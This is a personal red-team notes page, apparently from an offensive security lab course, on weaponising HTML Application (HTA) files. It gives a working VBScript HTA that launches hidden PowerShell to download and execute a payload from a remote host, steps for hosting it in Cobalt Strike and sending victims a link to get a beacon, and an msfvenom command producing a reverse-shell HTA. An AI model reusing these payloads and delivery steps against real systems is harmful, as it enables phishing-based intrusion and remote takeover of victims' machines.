---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[HTA (HTML Application)]]  
___

## Description:
An HTA is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer (VBScript and JScript).


An HTA is executed using `mshta.exe`, which is typically installed along with IE. In fact, `mshta` is dependant on IE, so if it has been uninstalled, HTAs will be unable to execute.

## Installation
To create an HTA, open **Visual Studio Code** on the **attacker-windows** VM and create a new empty file. Save the following content to `C:\Payloads\demo.hta
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
	Function Pwn()
	  Set shell = CreateObject("wscript.Shell")

	  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
	    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"""
	  Else
        shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"""
	  End If

	End Function

    Pwn
  </script>
</html>


```

In Cobalt Strike, go to **Attacks > Web Drive-by > Scripted Web Delivery (S)** and generate a 64-bit PowerShell payload for your HTTP listener. The URI path can be anything, Type should be powershell. Copy and paste into your HTA (remember to add double quotes around command).

Now create a 32-bit payload for the else statment, add it to your HTA.

Copy/paste this line into the HTA, it should look like this:

`shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"""


## Commands


host the HTA on the Team Server so we can simply send a link for them to download and execute. Go to **Attacks > Web drive-by > Host File**. Select **demo.hta** and provide a URI to access it on. 



Run the hta on the victum machine with internet explorer installed to get a beacon.

### msfvenom payload
`sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta`

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (02:01 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
